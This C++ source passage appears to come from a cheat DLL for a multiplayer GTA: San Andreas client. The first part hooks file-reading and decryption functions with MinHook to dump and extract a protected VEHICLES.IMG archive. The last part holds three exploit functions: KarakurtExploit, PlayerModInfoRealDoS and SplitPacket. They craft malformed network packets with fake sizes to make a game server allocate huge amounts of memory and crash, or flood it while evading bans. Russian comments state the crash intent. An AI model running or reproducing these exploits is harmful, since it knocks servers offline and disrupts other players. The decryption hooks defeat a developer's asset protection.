			xorstr_("[LOG] SetFilePointer to: 0x%llX\n"), newPos);
	}

	return result;
}

BOOL __stdcall Hook_ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead,
	LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped)
{
	auto it = g_capture.fileTrackers.find(hFile);
	if (it != g_capture.fileTrackers.end() && it->second.isVehiclesImg && g_capture.active)
	{
		g_capture.lastReadPosition = it->second.currentPosition;
		g_capture.lastReadSize = nNumberOfBytesToRead;

		LogInFile(xorstr_("img_dump.log"),
			xorstr_("[LOG] Reading %d bytes from position 0x%llX\n"),
			nNumberOfBytesToRead, g_capture.lastReadPosition);
	}

	BOOL result = g_original_ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);

	if (it != g_capture.fileTrackers.end() && it->second.isVehiclesImg)
	{
		it->second.currentPosition += *lpNumberOfBytesRead;
	}

	return result;
}

void* __cdecl Hook_IMG_DecryptFileData(int context, char* outputBuffer, void* inputBuffer, size_t inputSize)
{
	void* result = g_original_IMG_DecryptFileData(context, outputBuffer, inputBuffer, inputSize);

	if (g_capture.active && outputBuffer && inputSize > 0)
	{
		uint64_t writePosition = g_capture.lastReadPosition;

		if (writePosition + inputSize <= g_capture.decryptedData.size())
		{
			memcpy(g_capture.decryptedData.data() + writePosition, outputBuffer, inputSize);

			LogInFile(xorstr_("img_dump.log"),
				xorstr_("[LOG] Decrypted %d bytes at file offset 0x%llX\n"),
				inputSize, writePosition);

			if (!g_capture.headerDecrypted && writePosition == 0)
			{
				uint32_t magic = *(uint32_t*)outputBuffer;
				if (magic == MAGIC_VER2 || magic == MAGIC_VERF || magic == 0xFFFFFFFF)
				{
					g_capture.headerDecrypted = true;
					LogInFile(xorstr_("img_dump.log"),
						xorstr_("[LOG] Header decrypted, magic: 0x%08X\n"), magic);
				}
			}
		}
		else
		{
			LogInFile(xorstr_("img_dump.log"),
				xorstr_("[LOG] WARNING: Decrypt position 0x%llX + size %d exceeds file size %d\n"),
				writePosition, inputSize, g_capture.decryptedData.size());
		}
	}

	return result;
}

void LoadOriginalFile(const std::string& filepath)
{
	FILE* f = fopen(filepath.c_str(), "rb");
	if (!f)
	{
		LogInFile(xorstr_("img_dump.log"),
			xorstr_("[LOG] Failed to open original file: %s\n"), filepath.c_str());
		return;
	}

	fseek(f, 0, SEEK_END);
	size_t fileSize = ftell(f);
	fseek(f, 0, SEEK_SET);

	g_capture.originalData.resize(fileSize);
	g_capture.decryptedData.resize(fileSize);

	fread(g_capture.originalData.data(), 1, fileSize, f);
	fclose(f);

	memcpy(g_capture.decryptedData.data(), g_capture.originalData.data(), fileSize);

	LogInFile(xorstr_("img_dump.log"),
		xorstr_("[LOG] Loaded original file: %s (size: %d bytes)\n"),
		filepath.c_str(), fileSize);
}

void SaveDecryptedFile()
{
	if (g_capture.decryptedData.empty())
	{
		LogInFile(xorstr_("img_dump.log"),
			xorstr_("[LOG] No data to save\n"));
		return;
	}

	std::string outputPath = g_capture.filepath;
	size_t pos = outputPath.rfind(".img");
	if (pos != std::string::npos)
		outputPath.replace(pos, 4, "_decrypted.img");
	else
		outputPath += "_decrypted";

	FILE* output = fopen(outputPath.c_str(), "wb");
	if (output)
	{
		fwrite(g_capture.decryptedData.data(), 1, g_capture.decryptedData.size(), output);
		fclose(output);

		LogInFile(xorstr_("img_dump.log"),
			xorstr_("[LOG] Saved decrypted IMG to: %s (size: %d bytes)\n"),
			outputPath.c_str(), g_capture.decryptedData.size());
	}

	uint32_t magic = *(uint32_t*)g_capture.decryptedData.data();
	uint32_t fileCount = *(uint32_t*)(g_capture.decryptedData.data() + 4);

	std::string listPath = outputPath + ".txt";
	FILE* listFile = fopen(listPath.c_str(), "w");
	if (listFile)
	{
		fprintf(listFile, "Decrypted IMG Archive\n");
		fprintf(listFile, "Original: %s\n", g_capture.filepath.c_str());
		fprintf(listFile, "Size: %d bytes\n", g_capture.decryptedData.size());
		fprintf(listFile, "Magic: 0x%08X\n", magic);
		fprintf(listFile, "Files: %d\n\n", fileCount);

		if (magic == MAGIC_VER2 && fileCount > 0 && fileCount < 10000)
		{
			FileEntryV2* entries = (FileEntryV2*)(g_capture.decryptedData.data() + 8);
			for (uint32_t i = 0; i < fileCount; i++)
			{
				fprintf(listFile, "%4d: %-24s offset=0x%08X sectors=%d bytes=%d\n",
					i, entries[i].name, entries[i].offset * 2048,
					entries[i].size_sectors, entries[i].size_bytes);
			}
		}
		else if (magic == MAGIC_VERF && fileCount > 0 && fileCount < 10000)
		{
			EnhancedFileEntry* entries = (EnhancedFileEntry*)(g_capture.decryptedData.data() + 8);
			for (uint32_t i = 0; i < fileCount; i++)
			{
				fprintf(listFile, "%4d: %-24s offset=0x%08X sectors=%d size=%d flags=0x%08X\n",
					i, entries[i].name, entries[i].offset * 2048,
					entries[i].size_sectors, entries[i].full_size, entries[i].flags);
			}
		}
		else if (magic == 0xFFFFFFFF)
		{
			fprintf(listFile, "Old format IMG (no file table)\n");
		}

		fclose(listFile);
	}
}

void ExtractFiles()
{
	uint32_t magic = *(uint32_t*)g_capture.decryptedData.data();
	uint32_t fileCount = *(uint32_t*)(g_capture.decryptedData.data() + 4);

	if (fileCount == 0 || fileCount > 10000)
		return;

	std::string baseDir = g_capture.filepath;
	size_t pos = baseDir.rfind(".img");
	if (pos != std::string::npos)
		baseDir.replace(pos, 4, "_extracted");
	else
		baseDir += "_extracted";

	CreateDirectoryA(baseDir.c_str(), NULL);

	LogInFile(xorstr_("img_dump.log"),
		xorstr_("[LOG] Extracting %d files to: %s\n"), fileCount, baseDir.c_str());

	if (magic == MAGIC_VER2)
	{
		FileEntryV2* entries = (FileEntryV2*)(g_capture.decryptedData.data() + 8);

		for (uint32_t i = 0; i < fileCount; i++)
		{
			uint32_t fileOffset = entries[i].offset * 2048;
			uint32_t fileSize = entries[i].size_sectors * 2048;

			if (entries[i].size_bytes > 0)
				fileSize = entries[i].size_bytes;

			if (fileOffset + fileSize <= g_capture.decryptedData.size())
			{
				std::string fileName = baseDir + "\\" + entries[i].name;
				FILE* f = fopen(fileName.c_str(), "wb");
				if (f)
				{
					fwrite(g_capture.decryptedData.data() + fileOffset, 1, fileSize, f);
					fclose(f);
				}
			}
		}
	}
	else if (magic == MAGIC_VERF)
	{
		EnhancedFileEntry* entries = (EnhancedFileEntry*)(g_capture.decryptedData.data() + 8);

		for (uint32_t i = 0; i < fileCount; i++)
		{
			uint32_t fileOffset = entries[i].offset * 2048;
			uint32_t fileSize = entries[i].full_size;

			if (fileSize == 0)
				fileSize = entries[i].size_sectors * 2048;

			if (fileOffset + fileSize <= g_capture.decryptedData.size())
			{
				std::string fileName = baseDir + "\\" + entries[i].name;
				FILE* f = fopen(fileName.c_str(), "wb");
				if (f)
				{
					fwrite(g_capture.decryptedData.data() + fileOffset, 1, fileSize, f);
					fclose(f);
				}
			}
		}
	}

	LogInFile(xorstr_("img_dump.log"), xorstr_("[LOG] Extraction complete\n"));
}

void __cdecl Hook_process_img_archive(char* filename, int a2, int a3)
{
	if (filename && findStringIC(filename, "VEHICLES.IMG"))
	{
		LogInFile(xorstr_("img_dump.log"),
			xorstr_("[LOG] Processing: %s\n"), filename);

		g_capture.active = true;
		g_capture.filepath = filename;
		g_capture.headerDecrypted = false;
		g_capture.lastReadPosition = 0;
		g_capture.lastReadSize = 0;

		LoadOriginalFile(filename);
	}

	g_original_process_img_archive(filename, a2, a3);

	if (g_capture.active)
	{
		g_capture.active = false;

		LogInFile(xorstr_("img_dump.log"),
			xorstr_("[LOG] Processing complete\n"));

		SaveDecryptedFile();
		ExtractFiles();

		g_capture.originalData.clear();
		g_capture.decryptedData.clear();
		g_capture.fileTrackers.clear();
	}
}

bool InstallFastmanHooks()
{
	std::wstring lg_path = mapped_image_dir + xorstr_(L"\\img_dump.log");
	DeleteFileW(lg_path.c_str());

	if (MH_Initialize() != MH_OK && MH_Initialize() != MH_ERROR_ALREADY_INITIALIZED)
	{
		LogInFile(xorstr_("img_dump.log"), xorstr_("[LOG] Failed to initialize MinHook\n"));
		return false;
	}

	SigScan scan;
	DWORD processImgAddr = scan.FindCallPattern(xorstr_("$fastman92limitAdjuster.asi"),
		xorstr_("E8 ? ? ? ? 8B 55 ? 83 C4 ? 83 FA ? 72 ? 8B 4D ? 42 8B C1 81 FA ? ? ? ? 72 ? 8B 49 ? 83 C2 ? 2B C1 83 C0 ? 83 F8 ? 0F 87"));

	if (processImgAddr == 0)
	{
		LogInFile(xorstr_("img_dump.log"), xorstr_("[LOG] Failed to find process_img_archive\n"));
		return false;
	}

	DWORD decryptAddr = scan.FindCallPattern(xorstr_("$fastman92limitAdjuster.asi"),
		xorstr_("E8 ? ? ? ? 56 57 FF 75"));

	if (decryptAddr == 0)
	{
		LogInFile(xorstr_("img_dump.log"), xorstr_("[LOG] Failed to find IMG_DecryptFileData\n"));
		return false;
	}

	if (MH_CreateHook((LPVOID)processImgAddr, &Hook_process_img_archive,
		(LPVOID*)&g_original_process_img_archive) != MH_OK)
	{
		LogInFile(xorstr_("img_dump.log"), xorstr_("[LOG] Failed to create process_img hook\n"));
		return false;
	}

	if (MH_CreateHook((LPVOID)decryptAddr, &Hook_IMG_DecryptFileData,
		(LPVOID*)&g_original_IMG_DecryptFileData) != MH_OK)
	{
		LogInFile(xorstr_("img_dump.log"), xorstr_("[LOG] Failed to create decrypt hook\n"));
		return false;
	}

	if (MH_CreateHook(&CreateFileA, &Hook_CreateFileA,
		(LPVOID*)&g_original_CreateFileA) != MH_OK)
	{
		LogInFile(xorstr_("img_dump.log"), xorstr_("[LOG] Failed to create CreateFileA hook\n"));
		return false;
	}

	if (MH_CreateHook(&ReadFile, &Hook_ReadFile,
		(LPVOID*)&g_original_ReadFile) != MH_OK)
	{
		LogInFile(xorstr_("img_dump.log"), xorstr_("[LOG] Failed to create ReadFile hook\n"));
		return false;
	}

	if (MH_CreateHook(&SetFilePointer, &Hook_SetFilePointer,
		(LPVOID*)&g_original_SetFilePointer) != MH_OK)
	{
		LogInFile(xorstr_("img_dump.log"), xorstr_("[LOG] Failed to create SetFilePointer hook\n"));
		return false;
	}

	if (MH_EnableHook(MH_ALL_HOOKS) != MH_OK)
	{
		LogInFile(xorstr_("img_dump.log"), xorstr_("[LOG] Failed to enable hooks\n"));
		return false;
	}

	LogInFile(xorstr_("img_dump.log"), xorstr_("[LOG] All hooks installed successfully!\n"));
	return true;
}
int KarakurtExploit(uint32_t fake_size) // KarakurtExploit(0x80000000, 1); — один шот для краша
{
	if (g_pNet == nullptr)
	{
		//LogInFile(LOG_NAME, xorstr_("[LOG] CNet pointer == null (KarakurtExploit)\n"));
		return 0; // Нет сети — нахуй
	}
	NetBitStreamInterface* pBitStream = g_pNet->AllocateNetBitStream();
	if (pBitStream)
	{
		// Fix: 32-bit header/flag ==1 (LE), чтоб пройти read+cmp на 0x10029194/0x1002919A — иначе early-exit
		uint32_t header = 1;
		pBitStream->Write((const char*)&header, sizeof(uint32_t));

		// len0 = 0xFF — триггерим "широкую" длину, сервер прочитает 4 байта size после header
		pBitStream->Write((char)0xFF);

		// Size как uint32_t little-endian (4 байта сырых, чтоб сервер охуел от ~2x fake_size аллокации)
		pBitStream->Write((const char*)&fake_size, sizeof(uint32_t));

		// Junk: 2 байта нулей для length >=8 (теперь с header=11B, gate 0x100231E4 пройдёт)
		// Сервер аллоцирует full size ДО ReadAlignedBytes, так что DoS даже если junk мало
		char junk[2] = { 0x00, 0x00 };
		pBitStream->Write(junk, 2);

		// Log fix: %08X для hex, без string UB — чисто uint32_t
		//LogInFile(LOG_NAME, xorstr_("[LOG] Karakurt: BitStream size=11B, fake_size=0x%08X\n"), fake_size);

		// Send + check bool — клиентский netc.dll может дропнуть server-only ID
		bool sent = g_pNet->SendPacket(PACKET_ID_LIGHTSYNC, pBitStream, PACKET_PRIORITY_LOW, PACKET_RELIABILITY_UNRELIABLE);
		g_pNet->DeallocateNetBitStream(pBitStream);

		if (!sent)
		{
			//LogInFile(LOG_NAME, xorstr_("[LOG] Karakurt: SendPacket failed (netc.dll filter? server-only ID?)\n"));
			return 0; // Не улетело — хуйня на клиенте
		}

		//LogInFile(LOG_NAME, xorstr_("[LOG] Karakurt: Packet sent (post-join?), wait for server OOM/terminate in net.dll (sub_10003210)\n"));
	}
	else
	{
		//LogInFile(LOG_NAME, xorstr_("[LOG] Karakurt: AllocateNetBitStream failed\n"));
		return 0;
	}
	return 1;
}
int PlayerModInfoRealDoS(int packets_to_send = 50, uint16_t string_len = 0x8000) // string_len до 0xFFFF, packets_to_send — регулируй темп
{
	if (g_pNet == nullptr) {
		return 0;
	}

	const int junk_batch_size = 1024;
	char junk_batch[junk_batch_size];

	int sent_count = 0;

	for (int p = 0; p < packets_to_send; ++p) {
		NetBitStreamInterface* pBitStream = g_pNet->AllocateNetBitStream();
		if (!pBitStream) {
			break; // Клиент устал — стоп
		}

		// Опционально: если в handler'е есть заголовки ДО строк (id, count и т.д.) — добавь здесь по RE.
		// Например, если есть мод-id или что-то: pBitStream->Write((unsigned char)0x01); etc.

		for (int i = 0; i < 2; ++i) {  // Ровно две строки — как в билде
			pBitStream->Write(string_len); // ushort len

			// Junk с вариацией: базовый паттерн + счётчик пакета, чтоб не кэшировалось
			for (int b = 0; b < junk_batch_size; ++b) {
				junk_batch[b] = (char)(0x41 + (p + i) % 50); // 'A' + вариация, разные пакеты = разные строки
			}

			int remaining = string_len;
			while (remaining > 0) {
				int batch = remaining;
				if (batch > junk_batch_size) {
					batch = junk_batch_size;
				}
				pBitStream->Write(junk_batch, batch);
				remaining -= batch;
			}
		}

		// Reliable ordered — модинфо должен принимать, сплитит большие автоматически
		bool sent = g_pNet->SendPacket(PACKET_ID_PLAYER_MODINFO, pBitStream, PACKET_PRIORITY_HIGH, PACKET_RELIABILITY_RELIABLE_ORDERED);

		// Если не уходит (фильтр/state) — раскомментируй и попробуй unreliable:
		// bool sent = g_pNet->SendPacket(PACKET_ID_PLAYER_MODINFO, pBitStream, PACKET_PRIORITY_LOW, PACKET_RELIABILITY_UNRELIABLE);

		g_pNet->DeallocateNetBitStream(pBitStream);

		if (sent) {
			sent_count++;
		}
		else {
			// Лог: не улетело — уменьши string_len или проверь state/reliability
			break;
		}

		// Задержка, чтоб клиент/сеть не захлебнулась и бан не прилетел сразу
		Sleep(20); // 20-50мс — ~20-50 пакетов/сек, регулируй
	}

	//LogInFile(LOG_NAME, xorstr_("[LOG] ModInfoRealDoS: sent %d packets (2 strings x %u bytes, varied junk)\n"), sent_count, string_len);
	return sent_count;
}
int SplitPacket(uint32_t fake_size)
{
	if (g_pNet == nullptr) return 0;
	NetBitStreamInterface* pBitStream = g_pNet->AllocateNetBitStream();
	if (pBitStream)
	{
		uint32_t header = 1;
		pBitStream->Write((const char*)&header, sizeof(uint32_t));
		pBitStream->Write((char)0xFF);
		pBitStream->Write((const char*)&fake_size, sizeof(uint32_t));
		char junk[9000];
		memset(junk, 0xCC, sizeof(junk));
		pBitStream->Write(junk, sizeof(junk));
		bool sent = g_pNet->SendPacket(PACKET_ID_LIGHTSYNC, pBitStream, PACKET_PRIORITY_LOW, PACKET_RELIABILITY_RELIABLE);
		g_pNet->DeallocateNetBitStream(pBitStream);
		if (!sent) return 0;
	}
	else return 0;
	return 1;
}